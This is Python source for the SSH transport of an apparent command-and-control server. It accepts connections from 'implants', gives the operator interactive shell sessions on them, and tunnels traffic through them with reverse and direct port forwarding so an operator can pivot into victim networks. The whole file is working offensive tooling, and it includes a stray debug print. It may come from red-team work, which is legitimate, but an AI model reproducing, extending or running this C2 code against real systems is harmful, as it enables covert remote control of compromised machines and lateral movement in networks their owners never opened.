import paramiko
import socket
import logging
import threading
import os
import select
import struct
from typing import Tuple, Callable, Dict, Any, Optional

from ..session.client_session import ClientSession
from .base_server import BaseServer

logger = logging.getLogger('c2.ssh')

class SSHForwardingHandler:
    """Handles forwarding functionality for SSH connections"""
    
    def __init__(self, transport: Optional[paramiko.Transport] = None):
        self.transport = transport
        self.forwarded_ports = {}  # (addr, port) -> (socket, thread_event)
        self.dynamic_forwards = {}  # port -> (socket, thread_event)
        self.direct_tcpip_threads = {}  # channel_id -> thread_event
    
    def set_transport(self, transport: paramiko.Transport):
        """Store transport to open forwarded channels"""
        self.transport = transport
    
    def check_port_forward_request(self, addr: str, port: int):
        """Handle remote (reverse) port forwarding requests"""
        logger.info(f"Port forward request from implant: {addr}:{port}")
        
        # Check if this port is already forwarded
        if (addr, port) in self.forwarded_ports:
            logger.warning(f"Port {addr}:{port} is already forwarded, canceling previous forward")
            self.cancel_port_forward_request(addr, port)
            # Allow some time for the socket to close properly
            import time
            time.sleep(0.5)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((addr, port))
            sock.listen(5)
            
            # Create an event to signal thread termination
            stop_event = threading.Event()
            
            # Store both socket and event
            self.forwarded_ports[(addr, port)] = (sock, stop_event)
            
            # Start handler thread
            forward_thread = threading.Thread(
                target=self._forward_handler, 
                args=(sock, addr, port, stop_event), 
                daemon=True
            )
            forward_thread.start()
            
            return port
        except Exception as e:
            logger.error(f"Failed to bind forwarded port {addr}:{port}: {e}")
            return False
    
    
    def cancel_port_forward_request(self, addr: str, port: int):
        """Cancel a forwarded port and clean up resources"""
        logger.info(f"Canceling port forward for {addr}:{port}")
        
        if (addr, port) not in self.forwarded_ports:
            logger.warning(f"No forwarding found for {addr}:{port}")
            return
            
        sock, stop_event = self.forwarded_ports.pop((addr, port))
        
        # Signal the thread to stop
        stop_event.set()
        
        # Close the socket to unblock accept()
        try:
            sock.close()
            logger.info(f"Closed forwarded port {addr}:{port}")
        except Exception as e:
            logger.error(f"Error closing forwarded port: {e}")
    
    
    def _forward_handler(self, sock: socket.socket, addr: str, port: int, stop_event: threading.Event):
        """Accept connections on forwarded port and open channel back to client"""
        logger.info(f"Forward handler started for {addr}:{port}")
        
        # Set socket timeout to allow checking stop_event periodically
        sock.settimeout(1.0)
        
        while not stop_event.is_set():
            try:
                client_sock, client_addr = sock.accept()
                logger.debug(f"Accepted connection from {client_addr} on forwarded port {port}")
                
                if self.transport is None or not self.transport.is_active():
                    logger.warning("Transport not available for forwarded connection")
                    client_sock.close()
                    continue
                    
                channel = self.transport.open_forwarded_tcpip_channel((addr, port), client_addr)
                if channel is None:
                    logger.warning("Failed to open forwarded channel")
                    client_sock.close()
                    continue
                    
                threading.Thread(
                    target=self._tunnel_data, 
                    args=(client_sock, channel, stop_event), 
                    daemon=True
                ).start()
                
            except socket.timeout:
                # This is expected due to the timeout we set
                continue
            except OSError as e:
                if stop_event.is_set():
                    # This is an expected error when closing the socket
                    logger.debug(f"Socket closed for {addr}:{port}")
                else:
                    logger.error(f"Unexpected socket error in forward handler: {e}")
                break
            except Exception as e:
                logger.error(f"Error in forward handler {addr}:{port}: {e}")
                break
                
        logger.info(f"Forward handler stopped for {addr}:{port}")
    
    def _tunnel_data(self, sock: socket.socket, channel: paramiko.Channel, stop_event: threading.Event):
        """Bi-directional tunnel between socket and SSH channel"""
        try:
            sock.setblocking(False)
            channel.setblocking(False)
            
            while not stop_event.is_set() and channel.active:
                r, w, x = select.select([sock, channel], [], [], 0.5)
                if sock in r:
                    data = sock.recv(4096)
                    if not data:
                        break
                    channel.send(data)
                if channel in r:
                    data = channel.recv(4096)
                    if not data:
                        break
                    sock.send(data)
        except Exception as e:
            logger.error(f"Error in tunnel: {e}")
        finally:
            try:
                sock.close()
            except:
                pass
            try:
                channel.close()
            except:
                pass
            
    def handle_direct_tcpip_request(self, chanid: int, origin: Tuple[str, int], destination: Tuple[str, int]) -> int:
        """
        Allow the client's direct‑tcpip (local‑ or dynamic‑forward) channels.
        This is for local port forwarding from client to server.
        """
        src_addr, src_port = origin
        dst_addr, dst_port = destination
        
        logger.info(f"Direct‑tcpip channel {chanid} requested: {src_addr}:{src_port} -> {dst_addr}:{dst_port}")
        
        # Create a stop event for this direct-tcpip channel
        stop_event = threading.Event()
        self.direct_tcpip_threads[chanid] = stop_event
        
        # Get the channel once it's created
        def get_channel():
            channel = None
            for _ in range(10):  # Try a few times with a short delay
                if not self.transport:
                    return None
                channel = self.transport.accept(timeout=1.0)
                if channel and channel.get_id() == chanid:
                    return channel
            return None
        
        # Start a new thread to handle this forwarding request
        threading.Thread(
            target=self._handle_direct_tcpip,
            args=(chanid, dst_addr, dst_port, get_channel, stop_event),
            daemon=True
        ).start()
        
        return paramiko.OPEN_SUCCEEDED
    
    def _handle_direct_tcpip(self, chanid: int, dst_addr: str, dst_port: int, 
                            get_channel_func: Callable, stop_event: threading.Event):
        """Handle local port forwarding (direct-tcpip) requests"""
        try:
            # Get the channel for this direct-tcpip request
            channel = get_channel_func()
            if not channel:
                logger.error(f"Failed to get channel for direct-tcpip {chanid}")
                return
            
            logger.info(f"Got channel {channel.get_id()} for direct-tcpip request to {dst_addr}:{dst_port}")
            
            # Connect to the destination
            dest_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dest_sock.connect((dst_addr, dst_port))
                logger.info(f"Connected to destination {dst_addr}:{dst_port} for direct-tcpip forwarding")
                
                # Now tunnel data between the channel and destination socket
                self._tunnel_data(dest_sock, channel, stop_event)
                
            except Exception as e:
                logger.error(f"Failed to connect to {dst_addr}:{dst_port}: {e}")
                channel.close()
                dest_sock.close()
                
        except Exception as e:
            logger.error(f"Error handling direct-tcpip channel {chanid}: {e}")
        finally:
            # Clean up
            if chanid in self.direct_tcpip_threads:
                del self.direct_tcpip_threads[chanid]


class SSHServerInterface(paramiko.ServerInterface):
    """SSH Server Interface implementation with port forwarding support"""

    def __init__(self, config: dict):
        super().__init__()
        self.config = config
        self.pty_enabled = False
        self.term_settings = None
        self.event = threading.Event()
        self.is_sftp_connection = False
        self.transport = None
        self.forwarding_handler = SSHForwardingHandler()

    def set_transport(self, transport: paramiko.Transport):
        """Store transport to open forwarded channels"""
        self.transport = transport
        self.forwarding_handler.set_transport(transport)

    def check_channel_request(self, kind: str, chanid: int) -> int:
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        if kind == 'forwarded-tcpip':
            return paramiko.OPEN_SUCCEEDED
        if kind == 'direct-tcpip':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_port_forward_request(self, addr: str, port: int):
        print("hhhhhhhhhhhhh")
        """Handle remote (reverse) port forwarding requests"""
        return self.forwarding_handler.check_port_forward_request(addr, port)

    def cancel_port_forward_request(self, addr: str, port: int):
        """Cancel a forwarded port and clean up resources"""
        self.forwarding_handler.cancel_port_forward_request(addr, port)

    def check_channel_pty_request(self, channel, term, width, height, width_pixels, height_pixels, modes):
        self.pty_enabled = True
        self.term_settings = {
            'term': term,
            'width': width,
            'height': height,
            'width_pixels': width_pixels,
            'height_pixels': height_pixels,
            'modes': modes
        }
        logger.info(f"PTY requested: {term} ({width}x{height})")
        return True
    
    def check_channel_direct_tcpip_request(self, chanid: int,
                                           origin: Tuple[str, int],
                                           destination: Tuple[str, int]) -> int:
        """Handle direct-tcpip requests (local port forwarding)"""
        return self.forwarding_handler.handle_direct_tcpip_request(chanid, origin, destination)

    def check_channel_shell_request(self, channel):
        logger.info("Shell request accepted")
        return True

    def check_channel_subsystem_request(self, channel: paramiko.Channel, name: str) -> bool:
        if name == 'sftp':
            self.is_sftp_connection = True
            logger.info("SFTP subsystem request accepted")
            return True
        return False

    def check_auth_password(self, username: str, password: str) -> int:
        """Authenticate user with username and password"""
        if username == self.config['username'] and password == self.config['password']:
            return paramiko.AUTH_SUCCESSFUL
        logger.warning(f"Authentication failed for user: {username}")
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username: str) -> str:
        return 'password'


class SSHServer(BaseServer):
    """SSH transport implementation for C2 server"""

    def __init__(self, config: dict, client_connected_callback: Callable = None):
        super().__init__(config, client_connected_callback)
        self.server_socket = None
        self.host_key = None
        self._load_host_key()

    def _load_host_key(self):
        """Load or generate SSH host key"""
        key_path = self.config['host_key']
        try:
            if not os.path.exists(key_path):
                key = paramiko.RSAKey.generate(2048)
                key.write_private_key_file(key_path)
                self.host_key = key
            else:
                self.host_key = paramiko.RSAKey(filename=key_path)
            logger.info(f"Loaded host key from {key_path}")
        except Exception as e:
            logger.error(f"Failed to load host key: {e}")
            raise

    def start(self):
        """Start the SSH server"""
        if self.running:
            logger.warning("SSH server already running")
            return
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config['bind_address'], self.config['ssh_port']))
            self.server_socket.listen(5)
            self.running = True
            logger.info(f"SSH server listening on {self.config['bind_address']}:{self.config['ssh_port']}")
            threading.Thread(target=self._accept_connections, daemon=True).start()
        except Exception as e:
            logger.error(f"Failed to start SSH server: {e}")
            if self.server_socket:
                self.server_socket.close()
            raise

    def stop(self):
        """Stop the SSH server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
            self.server_socket = None
        logger.info("SSH server stopped")

    def _accept_connections(self):
        """Accept incoming SSH connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                threading.Thread(target=self._handle_connection, args=(client_socket, addr), daemon=True).start()
            except OSError:
                break
            except Exception as e:
                logger.error(f"Error in accept loop: {e}")

    def _handle_connection(self, client_socket: socket.socket, addr: Tuple[str, int]):
        """Handle a new SSH connection"""
        logger.info(f"New SSH connection from {addr[0]}:{addr[1]}")
        try:
            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self.host_key)

            server_interface = SSHServerInterface(self.config)
            transport.start_server(server=server_interface)
            server_interface.set_transport(transport)

            channel = transport.accept(20)
            if channel is None:
                logger.error(f"No channel established from {addr}")
                return

            if server_interface.is_sftp_connection or addr[0] == '127.0.0.1':
                logger.debug("SFTP connection - skipping client session registration")
                return

            if server_interface.pty_enabled and server_interface.term_settings:
                channel.get_pty(**server_interface.term_settings)
                channel.invoke_shell()

            client_info = channel.recv(1024).decode(errors='replace')
            logger.info(f"Client info received: {client_info.strip()}")

            client = ClientSession(
                channel=channel,
                client_info=client_info,
                addr=addr,
                config=self.config,
                transport_type='ssh',
                pty_enabled=server_interface.pty_enabled,
                term_settings=server_interface.term_settings
            )
            self.add_client(client)
            channel.send(' ')
        except Exception as e:
            logger.error(f"Error handling connection: {e}")